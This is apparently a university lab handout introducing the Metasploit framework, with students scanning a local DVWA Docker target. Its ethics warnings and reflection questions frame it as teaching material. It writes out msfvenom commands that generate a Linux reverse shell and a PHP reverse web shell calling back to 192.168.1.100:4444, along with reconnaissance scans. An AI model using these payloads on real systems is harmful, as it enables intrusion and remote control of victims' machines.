---
title: "Lab 05 — Exploitation Fundamentals: Metasploit Framework"
course: SCIA-472
week: 5
difficulty: "⭐⭐⭐"
time: "75-90 min"
---

# Lab 05 — Exploitation Fundamentals: Metasploit Framework

**Course:** SCIA-472 | **Week:** 5 | **Difficulty:** ⭐⭐⭐ | **Time:** 75-90 min

---

## Overview

Metasploit is the industry-standard exploitation framework used by penetration testers and red teams worldwide. In this lab, students explore the `msfconsole` interface, understand the modular architecture (exploits, payloads, auxiliary, post), generate payloads with `msfvenom`, and conduct controlled scanning against a DVWA target. All activity is strictly contained within Docker — no external systems are contacted.

---

!!! warning "Ethical Use — Read Before Proceeding"
    **NEVER** use Metasploit against systems you do not own or have explicit **written** permission to test. These techniques are illegal without authorization under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. All exploitation in this lab is strictly against the DVWA container running on **your local machine only**.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (8 checkpoints) | 40 pts |
    | Payload type comparison table | 20 pts |
    | Reflection questions (4 × 10 pts) | 40 pts |
    | **Total** | **100 pts** |

---

## Part 1 — Metasploit Architecture

### Step 1.1 — Pull the Metasploit image

```bash
docker pull metasploitframework/metasploit-framework 2>&1 | tail -3
```

### Step 1.2 — Explore module architecture

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
show module_types;
exit" 2>/dev/null | grep -v '^$' | head -20
```

**Expected output:** Lists module types — exploits, payloads, auxiliary, post, encoders, nops, evasion.

> 📸 **Screenshot 05a** — Capture the module types output.

### Step 1.3 — Check Metasploit version

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "version; exit" 2>/dev/null | grep -E 'Framework|Ruby|Nmap|Metasploit'
```

**Expected output:** Framework version line (e.g., `Framework: 6.4.0-dev`).

> 📸 **Screenshot 05b** — Capture the Metasploit version output.

---

## Part 2 — Searching for Modules

### Step 2.1 — Search for HTTP exploits

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
search type:exploit platform:linux http;
exit" 2>/dev/null | grep -E 'exploit/' | head -15
```

> 📸 **Screenshot 05c** — Capture the module search results showing exploit paths.

### Step 2.2 — Search for auxiliary scanners

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
search type:auxiliary name:http_version;
exit" 2>/dev/null | grep 'auxiliary' | head -10
```

### Step 2.3 — HTTP version scanner against target

First, create the lab network and start the DVWA target:

```bash
docker network create msflab
docker run -d --name msf-target --network msflab vulnerables/web-dvwa
sleep 8
```

Then run the HTTP version scanner:

```bash
docker run --rm --network msflab \
  metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
use auxiliary/scanner/http/http_version;
set RHOSTS msf-target;
set RPORT 80;
run;
exit" 2>/dev/null | grep -E 'Apache|PHP|Running|http'
```

**Expected output:** Apache version banner (e.g., `Apache/2.4.x (Debian) PHP/7.x`).

> 📸 **Screenshot 05d** — Capture the HTTP version scanner output showing the Apache banner.

---

## Part 3 — Understanding Payloads

### Step 3.1 — List available payload types

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
show payloads;
exit" 2>/dev/null | grep -E 'linux/x86|linux/x64|shell|meterpreter' | head -20
```

> 📸 **Screenshot 05e** — Capture the payload list showing linux/x86, linux/x64, shell, and meterpreter entries.

### Step 3.2 — Generate a reverse shell ELF payload with msfvenom

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfvenom \
  -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o /dev/null 2>&1 | grep -E 'size|bytes|Warning|No platform' | head -5
```

**Expected output:** `Payload size: 74 bytes` (or similar).

> 📸 **Screenshot 05f** — Capture the msfvenom ELF payload generation output showing payload size.

### Step 3.3 — Generate a PHP web shell payload

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfvenom \
  -p php/reverse_php \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw 2>/dev/null | head -5
```

**Expected output:** PHP code beginning with `eval(base64_decode(...` — a web shell that executes when uploaded to a vulnerable server.

> 📸 **Screenshot 05g** — Capture the PHP payload output.

---

## Part 4 — Running Auxiliary Scanners Against Target

### Step 4.1 — MySQL version scanner

```bash
docker run --rm --network msflab \
  metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
use auxiliary/scanner/mysql/mysql_version;
set RHOSTS msf-target;
run;
exit" 2>/dev/null | grep -E 'MySQL|version|Running'
```

**Expected output:** MySQL version banner from the DVWA database server.

> 📸 **Screenshot 05h** — Capture the MySQL version banner output.

### Step 4.2 — Directory scanner

```bash
docker run --rm --network msflab \
  metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
use auxiliary/scanner/http/dir_scanner;
set RHOSTS msf-target;
set RPORT 80;
set THREADS 5;
run;
exit" 2>/dev/null | grep -E 'Found|200|301|directory' | head -15
```

**Expected output:** HTTP 200/301 responses for discovered directories (e.g., `/dvwa/`, `/login.php`).

---

## Part 5 — Module Options System

### Step 5.1 — Inspect module options

```bash
docker run --rm metasploitframework/metasploit-framework \
  /usr/src/metasploit-framework/msfconsole -q -x "
use auxiliary/scanner/http/http_version;
show options;
exit" 2>/dev/null | grep -E 'Name|RHOSTS|RPORT|Required|Description' | head -15
```

**Expected output:** Table showing option names, current values, required status, and descriptions.

> 📸 **Screenshot 05i** — Capture the module options display.

---

## Cleanup

Run after completing all steps:

```bash
docker stop msf-target && docker rm msf-target
docker network rm msflab
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all screenshots labeled exactly as shown:

- [ ] **05a** — Metasploit module types (`show module_types`)
- [ ] **05b** — Metasploit version (`6.4.0-dev` or similar)
- [ ] **05c** — Module search results (HTTP exploits list)
- [ ] **05d** — HTTP version scanner output (Apache banner)
- [ ] **05e** — Payload list (`show payloads` filtered output)
- [ ] **05f** — msfvenom ELF payload generation (size in bytes)
- [ ] **05g** — msfvenom PHP payload (eval/base64 output)
- [ ] **05h** — MySQL version scanner output
- [ ] **05i** — Module options display (`show options`)

---

## Reflection Questions

Answer each question in **150-250 words**. Submit as a separate document.

1. **Module architecture:** Metasploit separates exploits, payloads, and auxiliary modules into distinct categories. Why is this separation useful for a penetration tester? Can you use a Metasploit payload without an exploit? Give a concrete example of when you would do this.

2. **Reverse shell mechanics:** `msfvenom` generated a 74-byte reverse shell payload. Explain how a reverse shell works — who initiates the TCP connection, the attacker or the victim? Why is the direction of the connection initiation critically important for bypassing perimeter firewalls?

3. **Kill chain positioning:** The `auxiliary/scanner/http/http_version` module identified the Apache version without exploiting anything. At what stage of the Cyber Kill Chain does this reconnaissance activity occur? How does running an auxiliary scanner differ operationally and legally from running an exploit module?

4. **Dual-use ethics:** Metasploit is identical to what attackers use — the same tool, same payloads, same modules. Security professionals use it for authorized testing; criminals use it for attacks. What specifically distinguishes legal use from criminal use? What written documentation must exist before a penetration tester can legally run Metasploit against a target?

---

*SCIA-472 | Week 5 | All activity confined to local Docker environment*
